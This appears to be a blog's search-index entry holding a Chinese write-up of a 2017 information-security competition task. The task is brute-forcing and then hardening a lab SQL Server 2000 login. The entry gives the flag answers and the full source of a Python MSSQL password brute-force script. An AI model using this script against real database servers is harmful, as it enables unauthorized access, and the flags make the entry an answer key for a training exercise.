<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2017全国信息安全高职大赛-2.5]]></title>
    <url>%2F2017%2F12%2F23%2F2017%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%AB%98%E8%81%8C%E5%A4%A7%E8%B5%9B-2.5%2F</url>
    <content type="text"><![CDATA[任务5：数据库访问渗透测试及其加固（50分）任务描述：假定各位选手是TaoJin电子商务企业的信息系统安全工程师，负责该企业信息系统的安全维护，在该系统中Web服务器中的数据库服务可能存在访问漏洞；首先，你需要对该程序进行渗透测试，确认程序确实存在该漏洞；其次，你需要对数据库服务进行安全加固配置，解决以上漏洞带来的问题；第三，你需要再次对该程序进行渗透测试，验证程序是否还存在访问漏洞。 任务环境：PC-1（须使用物理机中的虚拟机）：物理机操作系统：Windows7 64位旗舰版VMware Workstation 12 Pro虚拟机操作系统：WindowsXP虚拟机安装服务/工具1：EditPlus虚拟机安装服务/工具2：XFTP虚拟机网卡与物理机网卡之间的关系：Bridge（桥接） PC-3（须使用物理机中的虚拟机）：物理机操作系统：Windows7 64位旗舰版VMware Workstation 12 Pro虚拟机操作系统：Ubuntu Linux 32bit虚拟机操作系统安装工具集：BackTrack5虚拟机网卡与物理机网卡之间的关系：Bridge（桥接） DCST：服务器场景：WebServ2003服务器场景操作系统：Microsoft Windows2003 Server服务器场景安装服务/工具1：Apache2.2；服务器场景安装服务/工具2：Php6；服务器场景安装服务/工具3：Microsoft SqlServer2000；服务器场景安装服务/工具4：EditPlus； 任务步骤： 进入虚拟机操作系统：Ubuntu Linux 32bit中的/root目录，完善该目录下的mssql_brute_force.py文件，填写该文件当中空缺的Flag1字符串，将该字符串作为Flag值（形式：Flag1字符串）提交；（mssql_brute_force.py脚本功能见该任务第6题） 1Flag1global Found 进入虚拟机操作系统：Ubuntu Linux 32bit中的/root目录，完善该目录下的mssql_brute_force.py文件，填写该文件当中空缺的Flag2字符串，将该字符串作为Flag值（形式：Flag2字符串）提交；（mssql_brute_force.py脚本功能见该任务第6题） 1Flag2db = pymssql.connect(host=hostname, port='1433', user=username, password=passwd) 进入虚拟机操作系统：Ubuntu Linux 32bit中的/root目录，完善该目录下的mssql_brute_force.py文件，填写该文件当中空缺的Flag3字符串，将该字符串作为Flag值（形式：Flag3字符串）提交；（mssql_brute_force.py脚本功能见该任务第6题）将传递的文件参数赋值给passwdFile变量 1Flag3passwdFile = options.passwdFile 进入虚拟机操作系统：Ubuntu Linux 32bit中的/root目录，完善该目录下的mssql_brute_force.py文件，填写该文件当中空缺的Flag4字符串，将该字符串作为Flag值（形式：Flag4字符串）提交；（mssql_brute_force.py脚本功能见该任务第6题）读取文件内容 1Flag4f = open(passwdFile, 'r') 进入虚拟机操作系统：Ubuntu Linux 32bit中的/root目录，完善该目录下的mssql_brute_force.py文件，填写该文件当中空缺的Flag5字符串，将该字符串作为Flag值（形式：Flag5字符串）提交；（mssql_brute_force.py脚本功能见该任务第6题）将每行字符串赋值给password变量 1Flag5password = line.strip() 在虚拟机操作系统：Ubuntu Linux 32bit下执行mssql_brute_force.py文件，进行数据库超级管理员密码暴力破解渗透测试（使用字典文件./root/superdic.txt），将该文件执行后的显示结果中的最后1行内容作为Flag值（形式：文件执行后的显示结果中的最后1行字符串）提交； 1[+]MSSQL Password Found:123456 通过对服务器场景WebServ2003的数据库服务进行安全加固，阻止PC-3中渗透测试平台对其进行数据库超级管理员密码暴力破解渗透测试，并将进行安全配置的数据库身份验证选项中的英文单词作为Flag值（形式：进行安全配置的数据库身份验证选项中的唯一一个英文单词字符串）提交； 1Windows 验证在WebServ2003的数据库服务进行安全加固后，再次在虚拟机操作系统：Ubuntu Linux 32bit下执行mssql_brute_force.py文件，进行数据库超级管理员密码暴力破解渗透测试（使用字典文件./root/superdic.txt），将该文件执行后的显示结果中的最后1行内容作为Flag值（形式：文件执行后的显示结果中的最后1行字符串）提交； 1[-]Testing: 任务源码：12345678910111213141516171819202122232425262728293031323334353637383940import pymssqlimport optparsefrom threading import *import multiprocessingFound = 0def mssqlconn(hostname,username,passwd): global Found try: db = pymssql.connect(host=hostname, port='1433', user=username, password=passwd) print '[+]MSSQL Password Found:' + passwd Found = 1 except: print '[-]Testing:' + passwd def main(): parser = optparse.OptionParser('usage%prog '+'-H &lt;target host&gt; -U &lt;user&gt; -F &lt;password list&gt;') parser.add_option('-H', dest='tgtHost', type='string', help='specify target host') parser.add_option('-U', dest='user', type='string', help='specify the user') parser.add_option('-F', dest='passwdFile', type='string', help='specify password file') (options, args) = parser.parse_args() tgtHost = options.tgtHost user = options.user passwdFile = options.passwdFile if (tgtHost == None) | (user == None) | (passwdFile == None): print parser.usage exit(0) f = open(passwdFile, 'r') for line in f.readlines(): password = line.strip() mssqlconn(tgtHost,user,password) if Found: exit(0)if __name__ == '__main__': main() 任务自测：]]></content>
      <categories>
        <category>2017全国信息安全高职大赛</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mssql_brute_force</tag>
      </tags>
  </entry>
</search>
